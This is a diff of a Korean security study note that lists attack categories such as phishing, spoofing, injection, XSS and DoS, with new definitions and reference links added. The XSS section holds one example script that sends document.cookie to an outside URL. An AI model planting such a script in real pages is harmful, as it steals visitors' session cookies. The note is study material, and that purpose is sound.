@@ -111,15 +111,15 @@
     - 파밍(pharming) - 위조사이트
 - 가로채기 공격
   - 키 로깅(Key Logging)
-  - 트래픽 스니핑(Traffic Sniffing) - 패킷분석
-- Malware Attack
+  - 트래픽 스니핑(Traffic Sniffing) : 패킷분석도구
+- 악성코드(Malware Attack) [참고](https://library.gabia.com/contents/infrahosting/4961/)
   - 바이러스(Virus)
   - 웜(Worm)
     - 제로데이 공격(Zero Day Attack) :운영체제나 소프트웨어의 패치가 개발되기 전의 취약점을 이용하는 공격
   - 트로이 목마(Trojan Horse)
-- 스푸핑 공격
+- 스푸핑 공격 : 눈속임(spoof)에서 파생된 IT 용어로, 직접적으로 시스템에 침입을 시도하지 않고 피해자가 공격자의 악의적인 시도에 의한 잘못된 정보, 혹은 연결을 신뢰하게끔 만드는 일련의 기법들을 의미
   - ARP Spoofing
-  - IP Spoofing(세션하이제킹)
+  - IP Spoofing([세션하이재킹](https://peemangit.tistory.com/354))
   - DNS Spoofing
 - 소프트웨어 취약점 공격
   - Stack Buffer OverflowAttack
@@ -127,9 +127,12 @@
   - Command Injection Attack
   - SQL Injection Attack
 - XSS-Cross Site Scripting Attack
+  - XSS
   ``` html
    <script>document.location=’http://www.naver.com/app?cookie=’+document.cookie;</script>
   ```
+  - [CSRF](https://nordvpn.com/ko/blog/csrf/) & [SSRF](https://www.igloo.co.kr/security-information/ssrf-%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EA%B3%B5%EA%B2%A9%EC%82%AC%EB%A1%80-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91%EB%B0%A9%EC%95%88/)
+
 - 서비스 거부공격
   - 서비스거부(DoS)
     - Ping of Death Attack : 65535byte 이상의 패킷 전송
